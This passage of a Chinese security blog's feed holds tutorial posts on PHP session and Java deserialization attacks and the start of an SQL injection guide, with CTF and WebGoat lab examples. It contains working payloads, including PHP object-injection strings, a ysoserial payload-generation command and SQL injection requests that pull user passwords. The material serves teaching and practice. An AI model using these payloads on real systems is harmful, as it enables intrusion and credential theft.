&#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="3-6-3-php-session-序列化实际利用"><a href="#3-6-3-php-session-序列化实际利用" class="headerlink" title="3.6.3 php-session 序列化实际利用"></a>3.6.3 php-session 序列化实际利用</h3><p><strong>必备知识：</strong></p><ul><li><ul><li><p>选项 <code>session.auto_start=On</code>  ，PHP在接收请求时会自动初始化 Session，不需要执行 session_start()。默认情况下，该选项 <code>关闭</code> 。</p></li><li><p>选项 <code>session.use_strict_mode=0</code> ，默认值是0即未启动时，用户可以自定义 session。</p><p>方法：用户自己抓包，在 Cookie 里面设置，PHPSESSION=flag，那么PHP将会在服务器上也创建一个文件 <code>/tmp/sess_flag</code>  。这时用户并没有初始化 session ，php也照样自动初始化 session，而产生了一个键值，该键值由 <code>ini.get(&quot;session.upload_progress.prefix&quot;)+我们构造的session.upload_progress.name</code> 一起组成，最终写入 <code>sess_文件</code> li里。</p><p>linux 下，session文件一般的默认存储位置是 <code>/tmp 或 /var/lib/php/session</code></p></li></ul></li><li><p>避免 <code>session.upload_progress.cleanup=on</code> 的干扰</p><p>该选项导致文件成功上传之后，一旦读取 POST 信息之后，会清除进度信息，session 文件将会被立即清理。重点是 该选项默认开启。</p><ul><li>方法：<strong>条件竞争</strong></li></ul></li></ul><p><strong>当 session.auto_start＝On 时：</strong></p><p>如果 session.auto_start＝On ，就会自动注册 session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此我们需要 <strong>在脚本中设置 序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话</strong>，然后再设置需要的序列化处理器，那么第一次我们所使用的就是我们自己设置的存储器，而第二次执行时，系统仍会自动调用 session_start() 函数注册会话，这时所使用的就是默认的存储引擎了。</p><p>所以，如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题，如下面的代码：</p><p>已知：默认的存储引擎是 php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (ini_get(<span class="string">&#x27;session.auto_start&#x27;</span>)) &#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">&#125;</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure><p>第一次访问脚本 ，传入参数 <code>?a=|O:8:&quot;stdClass&quot;:0:&#123;&#125;</code>，脚本将会按照 php_serialize 处理数据，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:1:&quot;a&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>第二次访问，PHP 会按照 php.ini 里设置的序列化处理器反序列化存储的数据，这时如果 php.ini 里设置的是 php 处理器的话，将会反序列化伪造的数据，成功实例化了 stdClass 对象：）。</p><p><strong>当 session.auto_start＝Off 时：</strong></p><p>两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//foo1.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//foo2.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="comment">//or session.serialize_handler set to php in php.ini </span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$hi</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;hi;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问 foo1.php 提交数据 ?a=|O:1:”a”:1:{s:2:”hi”;s:7:”success”;}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:1:&quot;a&quot;;s:36:&quot;|O:1:&quot;a&quot;:1:&#123;s:2:&quot;hi&quot;;s:7:&quot;success&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>再访问 foo2.php ，成功</p><p><img src="https://i.loli.net/2021/09/12/9BrpshRMXJCjGUz.png" alt="image-20210912112309204"></p><p>由于 访问 foo1 时，传入的数据将会使用 php_serialize 进行序列化，然后再访问 foo2 时，程序将会使用 php 引擎来反序列化 session 中是之举，从而实例化 a 对象，而执行其中的魔术方法。</p><p><strong>补充：</strong></p><p>为什么在 解析 session 文件时为什么在解析session文件时直接对’|’后的值进行反序列化处理，这也是处理器的功能？这个其实是因为session_start()这个函数，可以看下官方说明：</p><blockquote><p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量</p></blockquote><h3 id="3-6-4-CTF-题目"><a href="#3-6-4-CTF-题目" class="headerlink" title="3.6.4 CTF 题目"></a>3.6.4 CTF 题目</h3><h1 id="速查"><a href="#速查" class="headerlink" title="速查"></a>速查</h1><ul><li><p>序列化后的结果是一串字符串。</p></li><li><p>反序列化会解开序列化的字符串生成相应类型的数据。</p></li></ul><p>如下代码示例，img是一个数组，下标分别是one和two，对应的值分别是flag,test。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$img[&#x27;one&#x27;] = &quot;flag&quot;;</span><br><span class="line">$img[&#x27;two&#x27;] = &quot;test&quot;;</span><br><span class="line">$a = serialize($img);</span><br><span class="line">var_dump($a);</span><br><span class="line">#输出: string(48) &quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">$b = unserialize($a);</span><br><span class="line">var_dump($b);</span><br><span class="line">/*输出如下内容:</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;one&quot;]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [&quot;two&quot;]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p><strong>序列化部分</strong>:</p><p>经过serialize序列化后生成了相应的字符串: a:2:{s:3:”one”;s:4:”flag”;s:3:”two”;s:4:”test”;}</p><p>a表示数组 , a:2中的2表示有两个键值，即对应的one、two两组键值对。</p><p>花括号中的s都表示string即字符串，</p><p>s:后面的值分别是3、4、3、4,即对应的字符串长度，比如one长度是三，flag长度是4</p><p><strong>反序列化部分:</strong></p><p>unserialize函数将字符串解序列化，我们用var_dump函数显示了他的详细信息。</p><p>可见解序列化后由变量$b，接收了img数组。</p><h3 id="序列化中每个字母的表示"><a href="#序列化中每个字母的表示" class="headerlink" title="序列化中每个字母的表示"></a>序列化中每个字母的表示</h3><table><thead><tr><th align="left">a</th><th align="left">array数组</th></tr></thead><tbody><tr><td align="left">b</td><td align="left">boolean判断类型</td></tr><tr><td align="left">d</td><td align="left">double浮点数</td></tr><tr><td align="left">i</td><td align="left">integer整数型</td></tr><tr><td align="left">o</td><td align="left">common object 一般的对象</td></tr><tr><td align="left">r</td><td align="left">reference引用类型</td></tr><tr><td align="left">s</td><td align="left">string字符串类型</td></tr><tr><td align="left">C</td><td align="left">custom object</td></tr><tr><td align="left">O</td><td align="left">class</td></tr><tr><td align="left">N</td><td align="left">null</td></tr><tr><td align="left">R</td><td align="left">pointer reference</td></tr><tr><td align="left">U</td><td align="left">unicode string</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //使用unserialize时触发 </span><br><span class="line">__sleep() //使用serialize时触发 </span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call()    //在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发 </span><br><span class="line">__get() //用于从不可访问的属性读取数据 </span><br><span class="line">__set() //用于将数据写入不可访问的属性 </span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发 </span><br><span class="line">__unset() //在不可访问的属性上使用<span class="built_in">unset</span>()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发 <span class="built_in">echo</span> 对象; <span class="variable">$text</span>=<span class="variable">$test</span>+$对象； </span><br><span class="line">__invoke() //当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span><br></pre></td></tr></table></figure><h2 id="1-3-危害"><a href="#1-3-危害" class="headerlink" title="1.3 危害"></a>1.3 危害</h2><p>SQL注入</p><p>代码执行</p><p>目录遍历</p><h1 id="四、JAVA-反序列化"><a href="#四、JAVA-反序列化" class="headerlink" title="四、JAVA 反序列化"></a>四、JAVA 反序列化</h1><p>序列化：将对象的状态信息转换为可以存储或者传输的形式的过程。序列化期间，对象将其当前的状态写入到临时或持久型储存区。</p><p>反序列化：从储存区读取到数据，将其还原为对象</p><p><strong>好处：</strong></p><ul><li>把对象的字节序列永久地保存到硬盘上，实现对象的持久化，通常存放在一个文件中；</li><li>利用序列化实现远程通信，即在网络上传递对象的字节序列。</li></ul><p><strong>实例理解</strong></p><blockquote><p>Web 服务器中的 Session 会话对象，当有10万用户并发访问，就有可能出现10万个 Session 对象，显然这种情况内存可能是吃不消的。</p><p>于是 Web 容器就会把一些 Session 先序列化，让他们离开内存空间，序列化到硬盘中，当需要调用时，再把保存在硬盘中的对象还原到内存中。</p><hr><p>我们知道，当两个进程进行远程通信时，彼此可以发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。</p><p>同样的序列化与反序列化则实现了 <strong>进程通信间的对象传送</strong>，发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。</p></blockquote><p><strong>JDK 类库中序列化 API</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化:对参数指定的obj对象进行序列化，将字节序列写入到一个目标输出流中</span></span><br><span class="line">ObjectOutputStream类 writeObject()</span><br><span class="line"><span class="comment">//反序列化:从一个源输入流中读取字节序列，把他们反序列化为一个对象，将其返回</span></span><br><span class="line">ObjectIntputStream类 readObject()</span><br></pre></td></tr></table></figure><p><strong>工具</strong>    <a href="https://github.com/frohoff/ysoserial/releases">https://github.com/frohoff/ysoserial/releases</a></p><p><strong>WebGoat</strong>    <a href="https://github.com/WebGoat/WebGoat/releases">https://github.com/WebGoat/WebGoat/releases</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull webgoat/webgoat-8.0</span><br><span class="line">docker images</span><br><span class="line">docker run -p 8080:8080 -t webgoat/webgoat-8.0</span><br><span class="line">http://192.168.158.111:8080/WebGoat/login</span><br></pre></td></tr></table></figure><h2 id="4-1-WebGoat"><a href="#4-1-WebGoat" class="headerlink" title="4.1 WebGoat"></a>4.1 WebGoat</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l</span><br><span class="line">即序列化+base64加密</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/15/bMn8ex1dK7QRVPD.png" alt="image-20210504171938337"></p><p><strong>命令执行 + 反弹 shell(以免不会回显)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#思路:以 执行 ipconfig 命令为例</span></span><br><span class="line">ipconfig --&gt; 序列化 --&gt; base64加密 --&gt; 最终转换成以rO0AB格式开头的字符串作为我们的payload</span><br></pre></td></tr></table></figure><p><strong>工具形成 payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-master-30099844c6-1.jar ysoserial.GeneratePayload Hibernatel calc.exe &gt; payload.bin</span><br></pre></td></tr></table></figure><p>再将生成的 payload.bin 进行一个base64加密：使用python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">c = <span class="built_in">open</span>(<span class="string">&quot;payload.bin路径&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">cc = base64.urlsafe_b64encode(c)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;wt&quot;</span>,ecoding=<span class="string">&quot;utf-8&quot;</span>).write(cc.decode())</span><br></pre></td></tr></table></figure><h2 id="4-2-CTFHUB-—-think-java"><a href="#4-2-CTFHUB-—-think-java" class="headerlink" title="4.2 CTFHUB —- think_java"></a>4.2 CTFHUB —- think_java</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /common/test/sqlDict HTTP/1.1</span><br><span class="line">Host: challenge-516f101de06176a6.sandbox.ctfhub.com:10080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">dbName=myapp?a=&#x27; union select (select pwd from user)#</span><br></pre></td></tr></table></figure><p>SQL注入获取用户账号吗和密码</p><p>登陆成功</p><p>对方回显数据：一段 ro0AB开头的数据</p><p>先进行base64解密</p><p>使用serializationDumper工具进行解析反序列话的数据</p><p>java -jar SerializationDumper.jar base64</p><p><img src="https://i.loli.net/2021/09/15/jJ5y4FCiGpXvRWZ.png" alt="image-20210504180422065"></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p><p><a href="https://www.cnblogs.com/niceyoo/p/10596657.html">https://www.cnblogs.com/niceyoo/p/10596657.html</a></p><p><img src="https://i.loli.net/2021/09/15/3iUZ8msAvRtHIjb.png" alt="image-20210504155703612"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;序列化与反序列化&quot;&gt;&lt;a href=&quot;#序列化与反序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化&quot;&gt;&lt;/a&gt;序列化与反序列化&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;序列化：持久保存，网络传输&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="WEB漏洞详解" scheme="https://xizhi-future.github.io/categories/WEB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    
    
    <category term="序列化与反序列化" scheme="https://xizhi-future.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入全解</title>
    <link href="https://xizhi-future.github.io/2021/10/07/SQL%20%E6%B3%A8%E5%85%A5%E5%85%A8%E8%A7%A3/"/>
    <id>https://xizhi-future.github.io/2021/10/07/SQL%20%E6%B3%A8%E5%85%A5%E5%85%A8%E8%A7%A3/</id>
    <published>2021-10-07T10:07:52.000Z</published>
    <updated>2021-10-07T10:09:47.831Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="SQL-注入全解"><a href="#SQL-注入全解" class="headerlink" title="SQL 注入全解"></a>SQL 注入全解</h1><p><a href="https://www.cnblogs.com/csnd/p/11807596.html#%E4%B8%83%EF%BC%9AREGEXP%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D">SQL 注入 详解</a></p><h2 id="一、注入分类"><a href="#一、注入分类" class="headerlink" title="一、注入分类"></a>一、注入分类</h2><ul><li><p><strong>注入点分类</strong></p><ul><li>数字型注入</li><li>字符型注入：单引号，双引号，加括号等等</li></ul></li><li><p><strong>提交方式分类</strong></p><ul><li>GET 方式注入</li><li>POST 方式注入</li><li>COOKIE 方式注入</li><li>HTTP 头部注入：XFF，UA，REFRERE</li></ul></li><li><p><strong>是否回显</strong></p><ul><li><p>联合查询</p></li><li><p>布尔盲注</p></li><li><p>报错注入</p></li><li><p>时间盲注</p></li><li><p>二次注入</p></li><li><p>堆叠查询（同时执行多条语句）</p></li></ul></li></ul><h2 id="二、注入判断"><a href="#二、注入判断" class="headerlink" title="二、注入判断"></a>二、注入判断</h2><ol><li><p><strong>工具扫描</strong>：网站漏扫工具，AWVS、AppScan、OWASP-ZAP、Nessus等</p></li><li><p><strong>手动测试：</strong></p><ul><li><p>单双引号，括号，进行组合测试，看是否报错</p></li><li><p><strong>对于数字型</strong>   <code>?id=3-1</code>  <code>?id=2#</code></p><p>如果显示的是 <code>?id=2</code> 时的正常页面，就说明我们所写的表达式进行了正确运算，可判断注入点是 数字型注入；如果返回不正常，则可能是非数字型注入。</p></li><li><p><strong>对于字符型</strong>   <code>?id=2a</code>   <code>?id=2&#39;#</code></p><p>Mysql 中，等号两边如果类型不一致，会发生强制类型转换。当数字与字符串进行比较时，首先先将字符串转换成数字，然后再进行比较。类似于 PHP 里面的 弱类型比较 ==。</p></li></ul><p><img src="https://i.loli.net/2021/08/19/2NOpAGDxYnlS9tJ.png" alt="image-20210819204302057"></p><ul><li><p><strong>对于布尔盲注</strong>   </p><p> <code>?id=1&#39; and &#39;1</code>        <code>?id=1&#39; and &#39;a</code></p><p>这里没有使用注释符号进行后面的单引号闭合，使用的是手工单引号闭合</p><p>或者，</p><p><code>?id=1&#39; and 1=1#</code>      <code>?id=1&#39; and 1=2#</code></p><p>两者的页面截然不同，一个正常回显，一个没有回显的话，就可判断是布尔盲注。</p></li><li><p><strong>对于 时间盲注</strong></p><p><code>?id=1&#39; and sleep(3)#</code>  ，类似的有以下几种</p><p>在MySQL中，有一个Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p><p>因此，利用benchmark函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，可以判断注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack，也就是时间盲注。</p><table><thead><tr><th>MySQL</th><th>benchmark(100000000,md(5))                              sleep(3)</th></tr></thead><tbody><tr><td>PostgreSQL</td><td>PG_sleep(5)                                                                  Generate_series(1,1000000)</td></tr><tr><td>SQLServer</td><td>waitfor delay ‘0:0:5’在判断数值型和字符串注入时还可以通过提交数学式的方式来判断，如提交’id=2/2’，如果字符型则返回id=2的结果，如果是数值型则返回id=1的结果。</td></tr></tbody></table></li><li><p>在判断数值型和字符串注入时还可以通过提交数学式的方式来判断，如提交’id=2/2’，如果字符型则返回id=2的结果，如果是数值型则返回id=1的结果。</p></li></ul></li><li><p><strong>常见 SQL 注入功能点</strong></p><p>只要是存在数据库交互的地方都有可能出现 SQL 注入。</p><p>常出现在 登录页面、订单页面、文章或新闻展示页面、修改密码页面（二次注入）、涉及获取 HTTP 头（XFF等）的功能点等。</p></li><li><p><strong>注释：–+    #</strong></p></li><li><p><strong>闭合方法：注释闭合、手动闭合 and ‘1</strong></p></li></ol><h2 id="三、Mysql-注入"><a href="#三、Mysql-注入" class="headerlink" title="三、Mysql 注入"></a>三、Mysql 注入</h2><h3 id="3-1-必备"><a href="#3-1-必备" class="headerlink" title="3.1 必备"></a>3.1 必备</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注释：</span><br><span class="line">#   </span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">/*......*/</span></span><br><span class="line"><span class="comment">/*!......*/</span></span><br></pre></td></tr></table></figure><p><strong>元数据库 information_schema</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">元数据库 information_schema 中：</span><br><span class="line"></span><br><span class="line">存放数据库信息的表：schemata</span><br><span class="line">schemata 表中</span><br><span class="line">字段 schema_name 存放所有数据库名；</span><br><span class="line"></span><br><span class="line">存放表信息的表：tables</span><br><span class="line">tables 表中</span><br><span class="line">字段 table_name 存放所有表名</span><br><span class="line">字段 table_schema 存放所有表所在的数据库名；</span><br><span class="line"></span><br><span class="line">存放所有字段信息的表：columns</span><br><span class="line">columns 表中</span><br><span class="line">字段 column_name 存放所有字段名，</span><br><span class="line">字段 table_name 存放所有字段所在的表名，</span><br><span class="line">字段 table_schema 存放所有字段所在的数据库名；</span><br></pre></td></tr></table></figure><p><img src="https://uploader.shimo.im/f/NL0MRR7pfNRLHGIt.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw" alt="img">i</p><p><strong>information_schema数据库中tables表中的内容：</strong><img src="https://uploader.shimo.im/f/YbpDwUspRC6ZzUFO.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw" alt="img"></p><p><img src="https://uploader.shimo.im/f/zbd7CueAIlwxSqFU.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw" alt="img"> </p><p><strong>infomation_schema数据库columns表中的内容:</strong><img src="https://uploader.shimo.im/f/GUHUd1jJZptHiyzk.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw" alt="img"><img src="https://uploader.shimo.im/f/AI204NdnIipb3mcU.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2Mjk5NTIzMDQsImciOiJ2VkFYbUdFR3o0aGduM203IiwiaWF0IjoxNjI5OTUyMDA0LCJ1c2VySWQiOjY5NjU2MzgzfQ.JLpY7Rkcz5zAWiZCTQeKG6YC3nVQGPswDchBsR95vjw" alt="img"></p><p><strong>语句分类：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>DQL(数据查询语言)：查询语句，所有的 <span class="keyword">select</span> 语句</span><br><span class="line"><span class="number">2.</span>DML(数据操作语言)：<span class="keyword">insert</span> , <span class="keyword">delete</span> , update , 对表中的 数据 进行 增删改</span><br><span class="line"><span class="number">3.</span>DDL(数据定义语言)：<span class="keyword">create</span> , <span class="keyword">drop</span> , <span class="keyword">alter</span> 对表 结构 的 增删改</span><br><span class="line"><span class="number">4.</span>TCL(事务控制语言)：<span class="keyword">commit</span> 提交数据，<span class="keyword">rollback</span> 回滚数据 Transaction</span><br><span class="line"><span class="number">5.</span>DCL(数据控制语言)：<span class="keyword">grant</span> 授权，<span class="keyword">revoke</span> 撤销权限等</span><br></pre></td></tr></table></figure><p><strong>基本语句：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 查库：</span><br><span class="line"><span class="keyword">show</span> databases；</span><br><span class="line"><span class="keyword">select</span> schema_name 